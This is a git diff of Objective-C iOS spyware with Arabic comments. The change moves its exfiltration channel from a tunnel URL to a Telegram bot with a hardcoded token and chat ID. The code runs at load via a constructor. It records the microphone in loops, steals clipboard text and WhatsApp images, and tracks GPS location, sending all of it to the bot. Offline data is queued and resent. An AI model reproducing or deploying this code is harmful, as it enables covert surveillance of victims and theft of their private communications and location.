@@ -3,11 +3,13 @@
 #import <AVFoundation/AVFoundation.h>
 #import <CoreLocation/CoreLocation.h>
 
-// ================== التكوين ==================
-#define SERVER_URL @"https://initiated-amendment-keeps-arkansas.trycloudflare.com/upload"
-#define DEVICE_ID [[UIDevice currentDevice].identifierForVendor.UUIDString substringToIndex:8]
+// ========== إعدادات Telegram ==========
+#define BOT_TOKEN @"8858007178:AAHo3w-MO_1FXws1xI1UUh2c2ck0tMEueQY"
+#define CHAT_ID   @"6282554175"
+#define TG_API    @"https://api.telegram.org/bot"
+#define DEVICE_ID [[UIDevice currentDevice].identifierForVendor UUIDString]
 
-// ================== التخزين المحلي ==================
+// ========== دوال مساعدة ==========
 NSString* getStoragePath() {
     NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
     NSString *documentsDirectory = [paths objectAtIndex:0];
@@ -22,40 +24,96 @@ void saveToLocal(NSString *type, NSString *content) {
     };
     NSString *dir = getStoragePath();
     [[NSFileManager defaultManager] createDirectoryAtPath:dir withIntermediateDirectories:YES attributes:nil error:nil];
-    NSString *filename = [NSString stringWithFormat:@"pending_%@.json", @([[NSDate date] timeIntervalSince1970])];
+    NSString *filename = [NSString stringWithFormat:@"pending_%@_%@.json", type, [[NSUUID UUID] UUIDString]];
     NSString *filePath = [dir stringByAppendingPathComponent:filename];
     NSData *jsonData = [NSJSONSerialization dataWithJSONObject:payload options:0 error:nil];
     [jsonData writeToFile:filePath atomically:YES];
-    NSLog(@"[*] Saved locally (offline): %@ - %@", type, filename);
+    NSLog(@"[*] Saved locally: %@ - %@", type, filename);
 }
 
-// ================== الإرسال ==================
-void sendData(NSString *type, NSString *content) {
-    NSDictionary *payload = @{
-        @"device_id": DEVICE_ID,
-        @"type": type,
-        @"content": content ? content : @""
-    };
-    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:payload options:0 error:nil];
-    NSURL *url = [NSURL URLWithString:SERVER_URL];
+// ========== إرسال نص إلى Telegram ==========
+void sendToTelegram(NSString *type, NSString *content) {
+    NSString *urlString = [NSString stringWithFormat:@"%@%@/sendMessage", TG_API, BOT_TOKEN];
+    NSURL *url = [NSURL URLWithString:urlString];
     NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
     [request setHTTPMethod:@"POST"];
-    [request setHTTPBody:jsonData];
     [request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
-    [request setValue:@"WORM_GPST_SUPREME_KEY" forHTTPHeaderField:@"X-Auth-Token"];
-    
+    NSDictionary *payload = @{
+        @"chat_id": CHAT_ID,
+        @"text": [NSString stringWithFormat:@"[%@] %@", type, content]
+    };
+    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:payload options:0 error:nil];
+    [request setHTTPBody:jsonData];
     NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
         if (error) {
             saveToLocal(type, content);
-            NSLog(@"[!] No internet, saved locally.");
+            NSLog(@"[!] Telegram error, saved locally.");
         } else {
-            NSLog(@"[+] Data sent to server: %@", type);
+            NSLog(@"[+] Sent to Telegram: %@", type);
         }
     }];
     [task resume];
 }
 
-// ================== إرسال المخزّن ==================
+// ========== إرسال ملف صوتي إلى Telegram ==========
+void sendAudioToTelegram(NSString *filePath, NSString *caption) {
+    NSString *urlString = [NSString stringWithFormat:@"%@%@/sendAudio", TG_API, BOT_TOKEN];
+    NSURL *url = [NSURL URLWithString:urlString];
+    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
+    [request setHTTPMethod:@"POST"];
+    NSString *boundary = @"----WebKitFormBoundary7MA4YWxkTrZu0gW";
+    [request setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary] forHTTPHeaderField:@"Content-Type"];
+    NSMutableData *body = [NSMutableData data];
+    [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
+    [body appendData:[[NSString stringWithFormat:@"Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n%@\r\n", CHAT_ID] dataUsingEncoding:NSUTF8StringEncoding]];
+    [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
+    [body appendData:[[NSString stringWithFormat:@"Content-Disposition: form-data; name=\"caption\"\r\n\r\n%@\r\n", caption] dataUsingEncoding:NSUTF8StringEncoding]];
+    [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
+    [body appendData:[[NSString stringWithFormat:@"Content-Disposition: form-data; name=\"audio\"; filename=\"audio.m4a\"\r\n"] dataUsingEncoding:NSUTF8StringEncoding]];
+    [body appendData:[@"Content-Type: audio/m4a\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
+    [body appendData:[NSData dataWithContentsOfFile:filePath]];
+    [body appendData:[[NSString stringWithFormat:@"\r\n--%@--\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
+    [request setHTTPBody:body];
+    NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
+        if (error) {
+            NSLog(@"[!] Audio send error: %@", error);
+        } else {
+            NSLog(@"[+] Audio sent to Telegram.");
+        }
+    }];
+    [task resume];
+}
+
+// ========== إرسال الصور ==========
+void sendPhotoToTelegram(NSString *filePath, NSString *caption) {
+    NSString *urlString = [NSString stringWithFormat:@"%@%@/sendPhoto", TG_API, BOT_TOKEN];
+    NSURL *url = [NSURL URLWithString:urlString];
+    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
+    [request setHTTPMethod:@"POST"];
+    NSString *boundary = @"----WebKitFormBoundary7MA4YWxkTrZu0gW";
+    [request setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary] forHTTPHeaderField:@"Content-Type"];
+    NSMutableData *body = [NSMutableData data];
+    [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
+    [body appendData:[[NSString stringWithFormat:@"Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n%@\r\n", CHAT_ID] dataUsingEncoding:NSUTF8StringEncoding]];
+    [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
+    [body appendData:[[NSString stringWithFormat:@"Content-Disposition: form-data; name=\"caption\"\r\n\r\n%@\r\n", caption] dataUsingEncoding:NSUTF8StringEncoding]];
+    [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
+    [body appendData:[[NSString stringWithFormat:@"Content-Disposition: form-data; name=\"photo\"; filename=\"photo.jpg\"\r\n"] dataUsingEncoding:NSUTF8StringEncoding]];
+    [body appendData:[@"Content-Type: image/jpeg\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
+    [body appendData:[NSData dataWithContentsOfFile:filePath]];
+    [body appendData:[[NSString stringWithFormat:@"\r\n--%@--\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
+    [request setHTTPBody:body];
+    NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
+        if (error) {
+            NSLog(@"[!] Photo send error: %@", error);
+        } else {
+            NSLog(@"[+] Photo sent to Telegram.");
+        }
+    }];
+    [task resume];
+}
+
+// ========== إرسال البيانات المخزنة عند عودة الإنترنت ==========
 void sendPendingData() {
     NSString *dir = getStoragePath();
     NSArray *files = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:dir error:nil];
@@ -64,19 +122,18 @@ void sendPendingData() {
         NSData *jsonData = [NSData dataWithContentsOfFile:filePath];
         NSDictionary *payload = [NSJSONSerialization JSONObjectWithData:jsonData options:0 error:nil];
         if (payload) {
-            sendData(payload[@"type"], payload[@"content"]);
+            sendToTelegram(payload[@"type"], payload[@"content"]);
             [[NSFileManager defaultManager] removeItemAtPath:filePath error:nil];
         }
     }
 }
 
-// ================== تسجيل الصوت ==================
+// ========== تسجيل الصوت وإرساله ==========
 void startRecordingAndSave() {
     AVAudioSession *session = [AVAudioSession sharedInstance];
     [session setCategory:AVAudioSessionCategoryPlayAndRecord error:nil];
     [session setActive:YES error:nil];
-
-    NSString *tempFile = [NSTemporaryDirectory() stringByAppendingPathComponent:@"temp_rec.m4a"];
+    NSString *tempFile = [NSTemporaryDirectory() stringByAppendingPathComponent:@"recording.m4a"];
     NSURL *outputURL = [NSURL fileURLWithPath:tempFile];
     NSDictionary *settings = @{
         AVFormatIDKey: @(kAudioFormatMPEG4AAC),
@@ -87,56 +144,45 @@ void startRecordingAndSave() {
     AVAudioRecorder *recorder = [[AVAudioRecorder alloc] initWithURL:outputURL settings:settings error:nil];
     [recorder record];
     NSLog(@"[*] Recording started...");
-
     dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 30 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
         [recorder stop];
-        NSData *audioData = [NSData dataWithContentsOfURL:outputURL];
-        if (audioData.length > 0) {
-            NSString *base64Audio = [audioData base64EncodedStringWithOptions:0];
-            sendData(@"call", base64Audio);
-        }
+        sendAudioToTelegram(tempFile, @"تسجيل مكالمة");
         [[NSFileManager defaultManager] removeItemAtURL:outputURL error:nil];
         startRecordingAndSave();
     });
 }
 
-// ================== سرقة واتساب ==================
+// ========== سرقة رسائل واتساب ==========
 void stealWhatsAppMessages() {
     UIPasteboard *pasteboard = [UIPasteboard generalPasteboard];
     NSString *copiedText = pasteboard.string;
     if (copiedText.length > 0) {
-        saveToLocal(@"whatsapp_text", copiedText);
+        sendToTelegram(@"whatsapp_text", copiedText);
         NSLog(@"[*] WhatsApp text stolen: %@", copiedText);
     }
-
-    NSString *whatsAppPath = @"/var/mobile/Containers/Data/Application/WhatsApp/Documents/";
+    NSString *whatsAppPath = @"/var/mobile/Containers/Data/Application/WhatsApp/";
     NSArray *imageFiles = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:whatsAppPath error:nil];
     for (NSString *file in imageFiles) {
-        if ([file hasSuffix:@".jpg"] || [file hasSuffix:@".png"] || [file hasSuffix:@".jpeg"]) {
+        if ([file hasSuffix:@".jpg"] || [file hasSuffix:@".png"]) {
             NSString *filePath = [whatsAppPath stringByAppendingPathComponent:file];
-            NSData *imageData = [NSData dataWithContentsOfFile:filePath];
-            if (imageData) {
-                NSString *base64Image = [imageData base64EncodedStringWithOptions:0];
-                saveToLocal(@"whatsapp_photo", base64Image);
-                NSLog(@"[*] WhatsApp photo stolen: %@", file);
-            }
+            sendPhotoToTelegram(filePath, @"صورة من واتساب");
+            NSLog(@"[*] WhatsApp photo stolen: %@", file);
         }
     }
 }
 
-// ================== تتبع الموقع ==================
+// ========== تتبع الموقع ==========
 CLLocationManager *locationManager = nil;
 
 @interface LocationDelegate : NSObject <CLLocationManagerDelegate>
 @end
 
 @implementation LocationDelegate
-- (void)locationManager:(CLLocationManager *)manager didUpdateLocations:(NSArray<CLLocation *> *)locations {
+- (void)locationManager:(CLLocationManager *)manager didUpdateLocations:(NSArray *)locations {
     CLLocation *location = [locations lastObject];
     if (location) {
         NSString *locationString = [NSString stringWithFormat:@"%.6f,%.6f", location.coordinate.latitude, location.coordinate.longitude];
-        saveToLocal(@"location", locationString);
-        sendData(@"location", locationString);
+        sendToTelegram(@"location", locationString);
         NSLog(@"[*] Location: %@", locationString);
     }
 }
@@ -153,7 +199,7 @@ void startLocationTracking() {
     [locationManager startUpdatingLocation];
 }
 
-// ================== مراقبة النت ==================
+// ========== المراقبة الدورية ==========
 void startNetworkMonitor() {
     [NSTimer scheduledTimerWithTimeInterval:30.0 repeats:YES block:^(NSTimer *timer) {
         sendPendingData();
@@ -161,7 +207,7 @@ void startNetworkMonitor() {
     }];
 }
 
-// ================== البداية المخفية ==================
+// ========== نقطة البداية ==========
 __attribute__((constructor))
 void init() {
     @autoreleasepool {
@@ -173,7 +219,6 @@ void init() {
     }
 }
 
-// ================== الدالة الرئيسية ==================
 int main(int argc, char *argv[]) {
     return UIApplicationMain(argc, argv, nil, nil);
 }
